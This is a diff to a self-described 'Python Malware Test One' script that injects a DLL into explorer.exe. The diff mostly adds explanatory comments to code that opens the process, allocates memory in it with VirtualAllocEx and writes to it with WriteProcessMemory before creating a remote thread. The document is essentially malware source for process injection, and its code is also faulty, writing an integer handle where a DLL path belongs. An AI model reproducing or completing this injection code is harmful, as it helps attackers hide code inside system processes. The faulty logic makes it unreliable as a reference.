@@ -1,8 +1,12 @@
 # Python Malware Test One- Basic DLL injection into explorer.exe
 # Not Fully Complete
 
-import ctypes
-import psutil
+# This script attempts to inject a DLL named "injrcted.dll" into the "explorer.exe" process using the Windows API functions provided by ctypes.windll.kernel32. 
+# It first loads the DLL file, retrieves the process ID (PID) of the "explorer.exe" process, opens a handle to that process, 
+# allocates memory within it, writes the DLL file into the allocated memory,and finally creates a remote thread within the process to execute the DLL.
+
+import ctypes  # For interacting with the Windows API
+import psutil  # For retrieving process information
 
 # Load the DLL file
 dll = ctypes.CDLL("path/to/injrcted.dll")
@@ -24,7 +28,8 @@ memory = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(dll._handle), 0x10
 
 # Write the DLL file to the allocated memory
 # Parameters: hProcess (handle to the process), lpBaseAddress (address of the memory to write to),
-# lpBuffer (buffer containing the data to be written), nSize (number of bytes to write), lpNumberOfBytesWritten (optional pointer to receive the number of bytes written)
+# lpBuffer (buffer containing the data to be written), nSize (number of bytes to write),
+# lpNumberOfBytesWritten (optional pointer to receive the number of bytes written)
 ctypes.windll.kernel32.WriteProcessMemory(handle, memory, dll._handle, len(dll._handle), 0)
 
 # Create a remote thread in the process to execute the DLL
